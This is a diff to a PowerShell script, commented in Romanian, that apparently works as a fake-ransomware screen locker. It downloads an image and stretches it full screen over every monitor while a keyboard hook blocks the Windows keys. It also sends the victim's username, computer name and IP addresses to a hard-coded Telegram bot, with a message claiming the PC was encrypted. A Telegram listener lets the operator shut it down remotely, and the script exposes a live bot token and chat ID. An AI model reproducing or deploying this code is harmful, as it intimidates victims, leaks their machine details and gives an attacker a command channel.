@@ -1,8 +1,8 @@
+
 # URL-ul imaginii
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
-# Descărcare imagine
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
@@ -11,7 +11,48 @@ function Download-Image {
     }
 }
 
-# Blocare taste Windows și monitorizare pentru închidere
+function Send-Telegram-Message {
+    $pc = $env:COMPUTERNAME
+    $user = $env:USERNAME
+
+    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
+        Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+
+    try {
+        $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
+    } catch {
+        $ipPublic = "n/a"
+    }
+
+    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
+    $uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
+    $body = @{ chat_id = '656189986'; text = $message } | ConvertTo-Json -Compress
+
+    try {
+        Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
+    } catch {}
+}
+
+function Start-Telegram-Listener {
+    $uriGet = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/getUpdates'
+    $lastUpdateId = 0
+
+    while ($true) {
+        try {
+            $response = Invoke-RestMethod -Uri $uriGet -TimeoutSec 5
+            foreach ($update in $response.result) {
+                if ($update.update_id -gt $lastUpdateId) {
+                    $lastUpdateId = $update.update_id
+                    if ($update.message.text -eq '❤️') {
+                        [Environment]::Exit(0)
+                    }
+                }
+            }
+        } catch {}
+        Start-Sleep -Seconds 3
+    }
+}
+
 function Block-And-MonitorKeys {
     Add-Type @"
         using System;
@@ -51,8 +92,12 @@ function Block-And-MonitorKeys {
             private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                     int vkCode = Marshal.ReadInt32(lParam);
-                    if (vkCode == 0x43) { Environment.Exit(0) }  # tasta C
-                    if (vkCode == 0x5B || vkCode == 0x5C) { return (IntPtr)1 }  # tastele Windows
+                    if (vkCode == 0x43) {
+                        Environment.Exit(0);
+                    }
+                    if (vkCode == 0x5B || vkCode == 0x5C) {
+                        return (IntPtr)1;
+                    }
                 }
                 return CallNextHookEx(hookId, nCode, wParam, lParam);
             }
@@ -61,10 +106,10 @@ function Block-And-MonitorKeys {
     [KeyboardMonitor]::BlockAndMonitor()
 }
 
-# Afișare imagine pe toate monitoarele
 function Show-FullScreenImage {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
+
     $screens = [System.Windows.Forms.Screen]::AllScreens
     $forms = @()
 
@@ -88,54 +133,15 @@ function Show-FullScreenImage {
         $pictureBox.Dock = 'Fill'
         $pictureBox.SizeMode = 'StretchImage'
         $form.Controls.Add($pictureBox)
-
         $forms += $form
     }
 
-    foreach ($form in $forms) {
-        [void]$form.Show()
-    }
-
+    foreach ($form in $forms) { [void]$form.Show() }
     [System.Windows.Forms.Application]::Run()
 }
 
-# Trimite mesaj inițial Telegram
-$pc = $env:COMPUTERNAME
-$user = $env:USERNAME
-$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
-    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
-
-try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string] } catch { $ipPublic = "n/a" }
-
-$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
-$uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
-$body = @{ chat_id = '656189986'; text = $message } | ConvertTo-Json -Compress
-try { Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json' } catch {}
-
-# Start listener pentru Telegram - comanda de oprire
-Start-Job -ScriptBlock {
-    $token = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
-    $chatId = '656189986'
-    $target1 = "👍 Codrut"
-    $target2 = "👍 $env:COMPUTERNAME"
-    $offset = 0
-
-    while ($true) {
-        try {
-            $url = "https://api.telegram.org/bot$token/getUpdates?offset=$offset"
-            $updates = Invoke-RestMethod -Uri $url -TimeoutSec 5
-            foreach ($update in $updates.result) {
-                $offset = $update.update_id + 1
-                if ($update.message.text -eq $target1 -or $update.message.text -eq $target2) {
-                    [Environment]::Exit(0)
-                }
-            }
-        } catch {}
-        Start-Sleep -Seconds 5
-    }
-} | Out-Null
-
-# Execuție principală
 Download-Image
+Send-Telegram-Message
+Start-Job -ScriptBlock { Start-Telegram-Listener }
 Block-And-MonitorKeys
 Show-FullScreenImage
